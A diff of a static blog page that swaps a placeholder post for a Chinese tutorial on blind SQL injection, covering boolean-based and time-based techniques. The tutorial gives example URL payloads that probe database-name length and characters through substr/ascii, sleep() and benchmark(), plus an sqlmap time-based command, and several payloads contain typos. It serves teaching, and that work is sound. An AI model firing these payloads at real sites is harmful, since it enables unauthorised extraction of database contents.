@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="">
   <meta name="keywords" content="">
-  <title>test1 - Cheekkk&#39;s Blog</title>
+  <title>SQL注入 盲注 - Cheekkk&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
@@ -136,7 +136,7 @@
                   
                   <span class="post-meta mr-2">
                     <i class="iconfont icon-chart"></i>
-                    4 字
+                    794 字
                   </span>
                 
 
@@ -146,7 +146,7 @@
                       <i class="iconfont icon-clock-fill"></i>
                     
                     
-                    1
+                    9
                      分钟
                   </span>
                 
@@ -175,15 +175,74 @@
           <div class="post-content mx-auto" id="post">
             
             <article class="markdown-body">
-              <h2 id="this-is-shortcut"><a href="#this-is-shortcut" class="headerlink" title="this is shortcut"></a>this is shortcut</h2><a id="more"></a>
+              <p>本文简单介绍了一种特殊的SQL注入，盲注</p>
+<a id="more"></a>
 
-<p>contents</p>
+<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p>盲注的原理是向数据库发送判断真假的语句，根据页面状态判断真假</p>
+<p>盲注可以分为基于布尔的盲注和基于时间的盲注，后者耗时较长</p>
+<h2 id="01-基于布尔的盲注"><a href="#01-基于布尔的盲注" class="headerlink" title="01 基于布尔的盲注"></a>01 基于布尔的盲注</h2><p>原理：根据页面显示的状态判断查询语句真假</p>
+<p>适用场景：网页会因为查询语句的真假而显示不同的状态</p>
+<p>例如一个网页在查询为真时，页面无显示，而查询为假时页面会有警告，这时就可以使用盲注进行注入，通常使用枚举的方法。</p>
+<p>常用的函数如substr(str,m,n)即从字符串str的第m个字符（从1开始计数，包括自身）向后取n个字符，substr(str,1,1)即取第一个字符。</p>
+<p>如获取数据库名：</p>
+<ul>
+<li>获取数据库长度<ul>
+<li>?id=1 and length(database())=1 –+ 页面显示为假</li>
+<li>?id=1 and length(database())=2 –+ 页面显示为假</li>
+<li>?id=1 and length(database())=3 –+ 页面显示为真，得到数据库名的长度为3</li>
+</ul>
+</li>
+<li>获取数据库名<ul>
+<li>?id=1 and ascii(substr(databse(),1,1))=97 –+ 页面显示为假</li>
+<li>?id=1 and ascii(substr(databse(),1,1))=98 –+ 页面显示为假</li>
+<li>?id=1 and ascii(substr(databse(),1,1))=99 –+ 页面显示为真，得到数据库名的第一个字符的ASCII码为99，即c</li>
+</ul>
+</li>
+</ul>
+<p>同理可以继续进行探测</p>
+<p><strong>为了避免次数过多，可以转换成ASCII码，然后使用位运算比较</strong></p>
+<h2 id="02-基于时间的盲注"><a href="#02-基于时间的盲注" class="headerlink" title="02 基于时间的盲注"></a>02 基于时间的盲注</h2><p>原理：根据页面延时判断查询语句真假</p>
+<p>适用场景：无论查询语句真假，网页显示的状态相同，此时我们可以使用sleep()函数构造查询语句，人为创造出页面显示的真假状态，即加载时长。</p>
+<p>常用语句if(exp,t,f)即当表达式exp为真时返回t，为假时返回f<br>if(ascII(substr(database(),1,1)=115,sleep(3),1))表示当数据库名第一个字符的ASCII码是115时就延时3s，否则返回1（正常显示无延时）</p>
+<p>如获取数据库名：</p>
+<ul>
+<li>获取数据库长度<ul>
+<li>?id=1 and if(length(database())=1,sleep(5),1) –+ 页面正常加载</li>
+<li>?id=1 and if(length(database())=2,sleep(5),1) –+ 页面正常加载</li>
+<li>?id=1 and if(length(database())=3,sleep(5),1) –+ 页面加载延时5s，得到数据库名的长度为3</li>
+</ul>
+</li>
+<li>获取数据库名<ul>
+<li>?id=1 and if(ascii(substr(databse(),1,1))=97,sleep(5),1) –+ 页面正常加载</li>
+<li>?id=1 and if(ascii(substr(databse(),1,1))=98,sleep(5),1) –+ 页面正常加载</li>
+<li>?id=1 and if(ascii(substr(databse(),1,1))=99,sleep(5),1) –+ 页面加载延时5s，得到数据库名的第一个字符的ASCII码为99，即c</li>
+</ul>
+</li>
+</ul>
+<p>除sleep外还可以使用benchmark函数<br>benchmark(n,exp)表示执行表达式exp n次，当n很大时就可以起到延时效果<br>如if(ascii(substr(databse(),1,1))=97,benchmark(md5(‘a’),1000000),1)</p>
+<h2 id="03-SQLmap盲注"><a href="#03-SQLmap盲注" class="headerlink" title="03 SQLmap盲注"></a>03 SQLmap盲注</h2><p>sqlmap -u url –technique T –dbs 指定-T为基于时间的盲注<br><strong>BEUSTQ B布尔 E错误 Uunion注入 S堆叠 T时间 Q查询</strong><br><strong>若不指定则使用全部技术，时间较长</strong></p>
 
             </article>
             <hr>
             <div>
               <div class="post-metas mb-3">
                 
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/WEB%E5%AE%89%E5%85%A8/">WEB安全</a>
+                    
+                      <a class="hover-with-bg" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>
+                    
+                  </div>
                 
               </div>
               
@@ -194,12 +253,18 @@
                   <div class="post-prev col-6">
                     
                     
+                      <a href="/2020/05/15/SQL%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E7%9A%84%E6%B3%A8%E5%85%A5/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SQL注入 基于报错的注入</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
                   </div>
                   <div class="post-next col-6">
                     
                     
-                      <a href="/2020/05/14/test/">
-                        <span class="hidden-mobile">test0</span>
+                      <a href="/2020/05/15/SQL%E6%B3%A8%E5%85%A5%E6%95%B4%E7%90%86/">
+                        <span class="hidden-mobile">SQL注入整理</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -308,7 +373,7 @@
         listClass: 'tocbot-list',
         isCollapsedClass: 'tocbot-is-collapsed',
         collapsibleClass: 'tocbot-is-collapsible',
-        collapseDepth: 0,
+        collapseDepth: 1,
         scrollSmooth: true,
         headingsOffset: -boardTop
       });
@@ -339,7 +404,7 @@
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "test1&nbsp;",
+        "SQL注入 盲注&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
